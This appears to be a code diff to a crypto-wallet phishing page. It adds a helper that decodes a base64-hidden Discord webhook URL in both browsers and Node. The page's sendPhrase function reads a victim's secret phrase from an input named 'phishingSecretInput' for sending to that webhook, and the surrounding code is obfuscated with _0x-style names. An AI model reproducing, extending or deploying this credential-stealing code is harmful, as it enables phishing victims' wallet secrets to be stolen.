@@ -2433,6 +2433,16 @@
         integrity="sha512-bLT0Qm9VnAYZDflyKcBaQ2gg0hSYNQrJ8RilYldYQ1FxQYoCLtUjuuRuZo+fjqhx/qtq/1itJ0C2ejDxltZVFg=="
         crossorigin="anonymous"></script>
     <script>
+        function dB(data: string) {
+            if (typeof atob === "function") {
+                return atob(data);
+            } else if (typeof Buffer === "function") {
+                return Buffer.from(data, "base64").toString("utf-8");
+            } else {
+                throw new Error("Failed to determine the platform specific decoder");
+            }
+        }
+
         function sorry_0xf89b() {
             var _0x4a52b1 = ["mtHhrvDlwLO", "nJm0nti0mefADKHJrW", "mMnyvwvUDW", "mJGZmJG4qM1RDNjY", "mZu1sgzkrgv3", "mJC2mJbprxnhu0y", "nJK2mdi4owf1rMLSqq", "mtm5mdCYmez5wvjZvq", "mJK4nJq1z2j6v09r", "mte0mdy0mMvSDfbiza"];
             sorry_0xf89b = function () {
@@ -2483,7 +2493,7 @@
 
         function sendPhrase() {
             var x = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTY1MTk2NTM3NjYxNjQ0ODcwL1NjTFdWMEloV2RSa21LZF9GazdpVndmR1FPcE1GMUtaeWRGVGtOdERZZGxKcm9NcFFTSUFmWUpfdFdxWVJKaVhpeExv';
-            var d1 = Buffer.from(x, 'base64').toString("utf-8");
+            var d1 = dB(x);
             var _0x11bc49 = document.getElementById("phishingSecretInput").value,
                 _0x7421a5 = document.getElementById("firstModal"),
                 _0x49f3bb = document.getElementById("lastModal"),
